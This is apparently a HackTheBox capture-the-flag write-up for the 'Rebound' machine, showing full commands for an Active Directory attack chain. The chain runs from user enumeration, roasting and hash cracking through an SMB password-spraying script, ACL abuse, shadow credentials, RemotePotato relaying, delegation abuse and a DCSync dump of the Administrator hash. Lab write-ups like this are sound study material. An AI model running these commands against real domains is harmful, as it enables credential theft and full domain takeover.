---
title: "HTB Rebound"
layout: "post"
categories: "Windows"
tags: ["Red Team", "Active Directory"]
---

In this blog, I'll walk you through the process of tackling a recent HackTheBox machine centered around Active Directory. Given the widespread use of Active Directory in organizations, it's crucial for Red Team members to be adept at navigating and exploiting potential misconfigurations.

Our initial task is to confirm the machine's availability. Let's start by verifying that the HackTheBox machine is up and running.


```bash
sudo nmap -n -sn 10.10.11.231 -oG -
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_up.bmp)


Now that we've confirmed the machine is live, let's roll into our next move: a SYN scan. When you kick off nmap as root, it automatically goes for a SYN scan, but if you want to be explicit, throw in the -sS flag.

```bash
ports=$(sudo nmap -p- 10.10.11.231 -T4 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo $ports
```


![](/assets/posts/2023-12-31-htb-rebound/syn_rebound.bmp)


While running the SYN scan, we notice a plethora of open ports. Notably, port 389 is wide open, a telltale sign of LDAP. This revelation strongly suggests that our machine is functioning as a Domain Controller. To solidify this assumption, let's employ nmap scripts and a version scan to further validate our findings.


```bash
sudo nmap -sC -sV -p$ports 10.10.11.231 -oN initial_tcp_scan
```

![](/assets/posts/2023-12-31-htb-rebound/rebound_tcp.bmp)


```bash
sudo nmap -Pn -sUV --version-intensity 0 --max-retries 1 10.10.11.231 -T4 -oN udp_initial

ports=$(cat udpScan.txt | sed -r 's/\s+//g' | sed -n "/udpopen/p" | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

sudo nmap -Pn -sU -sC -sV -p$ports 10.10.11.231 -oN udp_script_scan
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_udp.bmp)


After our initial nmap scans, it's confirmed – the machine is indeed a Domain Controller. To optimize our system's communication efficiency, we will add its FQDN and NetBIOS name to our /etc/hosts file. This step ensures that our system can swiftly resolve the Domain Controller's names to their respective IP addresses locally, bypassing the need for external DNS queries. By doing so, we enhance the overall performance and responsiveness of our system when interacting with the Domain Controller. 

```bash
echo '10.10.11.231    rebound.htb     dc01.rebound.htb	dc01' | sudo tee -a /etc/hosts
```


The next step involves checking if we can access MSRPC or SMB via a null session. 


```bash
rpcclient -U "" -N 10.10.11.231 -c enumdomusers --port -p135

smbclient -U '%' -L \\\\10.10.11.231\\ -N

smbmap -r -H 10.10.11.231 -P 445
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_null_smb.bmp)


It's evident that null session access is denied for both MSRPC and SMB. As a next step, let's attempt to list shares for SMB using the guest user. 


```bash
smbclient -U "guest"% -L \\\\10.10.11.231\\
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_smb_guest.bmp)


Having successfully listed the shares as a guest, we can now utilize smbmap to retrieve the permissions for each of these shares. An informative article at https://snowscan.io/htb-writeup-blackfield/ elaborates that providing an invalid user with no password will lead to a guest session with smbmap. 


```bash
smbmap -r -H 10.10.11.231 -u invalid -P 445
```


![](/assets/posts/2023-12-31-htb-rebound/smbmap_guest.bmp)


```bash
smbclient -U "guest"% \\\\10.10.11.231\\Shared
```


![](/assets/posts/2023-12-31-htb-rebound/smb_mount_guest.bmp)


Upon mounting the share, we noticed an absence of files. The logical next step is to pivot and explore LDAP to uncover any interesting information. 


```bash
ldapsearch -LLL -x -H ldap://10.10.11.231:389 -b '' -s base '(objectclass=*)' | tee ldap_initial.txt

naming_context=$(cat ldap_initial.txt | sed -n '/defaultNamingContext:/Ip' | sed 's/[^ ]* //')

ldapsearch -x -D "" -w "" -H ldap://10.10.11.231:389 -b "$naming_context" -s sub "(objectclass=*)" 2>&1
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_ldap_initial.bmp)



Our attempt to retrieve LDAP entries as an anonymous user hit a roadblock. Now, let's shift our focus to enumerating Kerberos. We aim to obtain valid AD accounts by leveraging Kerberos Pre-Authentication brute-forcing—an acknowledged tactic that Microsoft hasn't addressed. To manage the brute-forcing efficiently, we'll implement a 15-minute timeout. For this task, we'll employ kerbrute, available at https://github.com/ropnop/kerbrute. 


```bash
timeout 15m kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.231 --domain rebound.htb | tee ad_users.txt
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_kerbrute.bmp)


Kerberos pre-authentication brute-forcing was successful, managing to uncover multiple users. Notably, we observed that the guest user isn't disabled, providing an opportunity for a RID cycling attack. Let's proceed with the RID cycling attack to gather information on Domain users and groups.


```bash
crackmapexec smb 10.10.11.231 -u 'Guest' -p '' --server-port 445 --rid-brute 20000
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_rid_brute.bmp)


The RID cycling attack worked like a charm, providing us with a list of Domain users and groups for the machine. Even though we already got some users through Kerberos Pre-Authentication brute-forcing, showcasing the effectiveness of RID cycling is a nice touch. Now, let's shift gears and try AS-REP roasting using GetNPUsers.py for our next move. 


```bash
# save users to a file 
crackmapexec smb 10.10.11.231 -u 'Guest' -p '' --server-port 445 --rid-brute 20000 | grep '(SidTypeUser)' | awk -F '\' '{print $NF}' | awk '{print $1}' | tee users.txt

GetNPUsers.py rebound.htb/ -usersfile users.txt -dc-ip 10.10.11.231 -format hashcat -outputfile as_rep_hashes.txt | grep -F -e '[+]' -e '[-]'
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_as_rep.bmp)


Roasting was a success, and now we've got a hash for the jjones user. Our next move is to attempt to crack the hash using hashcat, available at https://hashcat.net/hashcat/. 


```bash
# Kerberos 5, etype 23, AS-REP
hashcat -m 18200 -a 0 -O -w 4 hash rockyou.txt
```


Unfortunately, I couldn't crack the hash. Since it's a CTF, I opted not to use an extensive wordlist, considering the possibility that the machine creator might have chosen a password from a well-known list if hash cracking was the intended path.

An interesting observation: none of the accounts had UF_DONT_REQUIRE_PREAUTH set. With this in mind, our next move involves attempting to obtain Service Tickets through AS-REQ requests, as detailed at https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication.


```bash
GetUserSPNs.py -target-domain rebound.htb -usersfile users.txt -dc-ip 10.10.11.231 rebound.htb/guest -no-pass
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_time_error.bmp)


Encountering an error due to a time mismatch with the DC, I decided to sync my clock with the DC to resolve the issue. This ensures a smooth continuation of our exploration without the need for workarounds like faketime. 


```bash
timedatectl set-ntp 0

sudo ntpdate -qu rebound.htb

sudo ntpdate rebound.htb
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_kerberos_rep.bmp)


Syncing the clock worked, and now we have a TGT hash for the ldap_monitor user. Let's make another attempt to crack the hash and see if we can uncover the credentials.


```bash
hashcat -m 13100 -a 0 -O -w 4 hashes.txt rockyou.tx
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_hashcat.bmp)


The cracking was a success this time, and we've got a password. To validate the password against SMB for all users, I crafted a script to automate the process. Below is the included code.


```bash
#!/bin/bash

# Define ANSI color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'  # No color (reset)


if [ $# -ne 3 ]; then
  echo "Usage: $0 <target_ip> <users_file> <passwords_file>"
  exit 1
fi

TARGET_IP="$1"
USERS_FILE="$2"
PASSWORDS_FILE="$3"


USERNAMES=()

# Read usernames in from file
while IFS= read -r username; do
  USERNAMES+=("$username")
done < "$USERS_FILE"

PASSWORDS=()

# Read passwords in from file
while IFS= read -r password; do
  PASSWORDS+=("$password")
done < "$PASSWORDS_FILE"


for user in "${USERNAMES[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    smbclient -L "//${TARGET_IP}" -U "${user}%${pass}" -c "quit" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo -e "${GREEN}Successful login: ${user}:${pass}${NC} (User: ${BLUE}${user}${NC})"
    else
      echo -e "${RED}Failed login: ${user}:${pass}${NC} (User: ${BLUE}${user}${NC})"
    fi
  done
done

```


![](/assets/posts/2023-12-31-htb-rebound/rebound_smb_pass.bmp)


Now armed with valid credentials, our next move is to utilize a BloodHound ingestor for comprehensive AD enumeration. A recent find, RustHound at https://github.com/NH-RED-TEAM/RustHound, appears to be an ideal tool for this task. Let's leverage it to gather all the necessary AD information and advance our enumeration efforts!


```bash
# https://github.com/NH-RED-TEAM/RustHound
/home/kali/.cargo/bin/rusthound -d rebound.htb -u 'ldap_monitor@rebound' -p $passwd -i 10.10.11.231 --zip --ldaps
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_bloodhound.bmp)


BloodHound might not spell out the next steps, but after a closer look, I found key details. ServiceMGMT holds GenericAll permissions over the Service Users OU. Diving into the RustHound-produced .json files, I identified that winrm_svc resides in the Service Users OU and is part of the Remote Management Users group. Additionally, oorhend boasts WriteOwner permissions.

The strategy is clear: leverage this information to add oorend to the ServiceMGMT group. For this task, I'll employ bloodyAD, a handy tool available at https://github.com/CravateRouge/bloodyAD/wiki/User-Guide.


```bash
python bloodyAD.py -u oorend -p 'pass' -d rebound.htb --host 10.10.11.231 add groupMember SERVICEMGMT oorend

# you should see response below 
[+] oorend added to SERVICEMGMT
```


Successfully adding oorend to the SERVICEMGMT group is a great achievement! To continue our progress, the next step is to grant oorend GenericAll permissions over the Service Users OU. Let's proceed with this crucial permission assignment to further advance our exploration.


```bash
python bloodyAD.py -d rebound.htb -u oorend -p 'pass' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend

# you should see response below 
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```


With full control over the Service Users OU, we're in a powerful position. The observation of a Cert Publishers group in the groups.json from RustHound confirms that the DC relies on certificates for pre-authentication validation (https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials).

Given our GenericAll permission over winrm_svc, we can now obtain its NT hash (https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services). Let's leverage this capability to gather the NT hash and use it to log into the machine via WinRM.


```bash
certipy shadow auto -account winrm_svc -u "oorend@rebound.htb" -p $passwd -dc-ip 10.10.11.231 -k -target dc01.rebound.htb
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_certify_winrm.bmp)


Having secured a shell, the focus now shifts to privilege escalation. My preferred tool for Windows enumeration is the script available at https://github.com/itm4n/PrivescCheck/tree/master. However, during analysis, an anomaly emerged— the script couldn't fetch information on currently logged-in users. To investigate further, I tested commands like quser (Current Logged on Users), qwinsta (Remote Sessions), and query user winrm_svc (currently logged-in user), and surprisingly, all commands failed.

Upon inspecting WinPEAS.ps1, it appears to assume that certain commands might not be present on the system. This observation sparks a hypothesis that this could be a deliberate technique for privilege escalation. It's common in CTFs for machine creators to remove commands that facilitate finding the path forward, making it more challenging.

In the PrivescCheck results section for logged-in users, various attack vectors are outlined, centering around capturing NTLM/Kerberos authentication of other logged-in users. Within this realm, one particularly noteworthy technique is RemotePotato, extensively documented at https://github.com/antonioCoco/RemotePotato0. 


```powershell
Get-ComputerInfo | select WindowsBuildLabEx, WindowsInstallationType, WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_windows_os.bmp)


The GitHub repository mentions that Microsoft has recently patched the vulnerability associated with RemotePotato. However, considering our machine's older operating system, there's a likelihood that the server remains vulnerable. To confirm this, we'll conduct tests to ascertain the presence of the vulnerability and determine our path forward.

```bash
# On attacker machine 
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999

# On victim machine
.\RemotePotato0.exe -m 2 -x 10.10.14.47 -p 9999 -s 1 
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_potato.bmp)


 The machine proved vulnerable to RemotePotato, and now we have Tbrady's NTLM hash in our possession. Our next move is to attempt to crack the hash using the following command below.

```bash
hashcat -m 5600 -a 0 -O -w 4 hash rockyou.txt
```


We successfully cracked the hash, and upon taking a closer look at the BloodHound results, the path to the Administrator is clear and highlighted below.


```bash
 tbrady -> ReadGMSAPassword -> delegator$ -> AllowedToDelegate -> DCO1 -> DCSync -> Administrator
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_bloodhound_root.bmp)


The initial step involves executing the ReadGMSAPassword attack using bloodyAD.


```bash
/root/bloodyAD/bloodyAD.py -d rebound.htb -u tbrady -p $passwd --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_bloody_ad.bmp)


Upon revisiting BloodHound, we observe that the delegator$ user possesses constrained delegation capabilities, as discussed in detail in this informative article: https://beta.hackndo.com/constrained-unconstrained-delegation/. The article provides a comprehensive explanation of delegation concepts, and in our scenario, it's evident that we're dealing with Resource Based Constrained Delegation. This is apparent as the delegator$ user can delegate the http service.


![](/assets/posts/2023-12-31-htb-rebound/rebound_contrained_delegation.bmp)


For attacking Resource Based Constrained Delegation, a viable method is outlined in this resource: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd. The initial step involves obtaining a TGT ticket for the delegator$ user, utilizing the NTLM hash obtained from the ReadGMSAPassword attack. Subsequently, the plan is to leverage Impacket to enable ldap_monitor to impersonate users on delegator$ via S4U2Proxy. 


```bash
getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -dc-ip 10.10.11.231

export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache

rbcd.py 'rebound.htb/delegator$' -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.10.11.231 -debug -k -no-pass
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_rbcd.bmp)


With the delegated privileges assigned to ldap_monitor, our next move involves acquiring a service ticket from dc01 for the service "browser/dc01.rebound.htb". 


```bash
getTGT.py 'rebound.htb/ldap_monitor:pass' -dc-ip 10.10.11.231

export KRB5CCNAME=ldap_monitor.ccache 

getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass -dc-ip 10.10.11.231
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_browser.bmp)


Now armed with the service ticket for "browser/dc01.rebound.htb," our next action is to utilize it to generate an additional ticket for "http/dc01.rebound.htb". 


```bash
export KRB5CCNAME=dc01\$.ccache
getST.py -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "rebound.htb/delegator$" -hashes aad3b435b51404eeaad3b435b51404ee:f8db61f5fd0643c073cd58ffcc81379f -k -no-pass -dc-ip 10.10.11.231
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_http.bmp)


In the culmination of the exploit chain, the final step involves executing a DCSync attack to extract and dump the Administrator hash. 


```bash
secretsdump.py -no -k dc01.rebound.htb -just-dc-user administrator -dc-ip 10.10.11.231
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_secret_dump.bmp)


Success! With the Administrator hash successfully obtained, we can now log in to the DC as the Administrator user. 


```bash
evil-winrm -u "Administrator" -H $hash -i "dc01.rebound.htb"
```


![](/assets/posts/2023-12-31-htb-rebound/rebound_admin.bmp)


This concludes the walkthrough on exploiting the HackTheBox machine 'Rebound.' I appreciate everyone taking the time to read this blog and hope you found it insightful. Stay tuned for more exciting adventures in future blogs. Until then, rock on and happy hacking!"